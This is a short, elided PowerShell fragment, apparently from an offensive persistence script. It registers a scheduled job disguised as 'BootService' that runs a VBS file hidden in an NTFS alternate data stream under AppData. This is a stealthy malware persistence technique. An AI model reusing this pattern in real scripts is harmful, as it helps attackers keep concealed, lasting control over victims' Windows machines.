...
#>
    ...
    if (!(Test-IsAdmin)){
       ...
       $FinCommand = {Register-ScheduledJob -Name BootService -ScriptBlock {wscript.exe $env:USERPROFILE\AppData:$vbsFile} -Trigger $Trig -ScheduledJobOption $Option -RunNow}
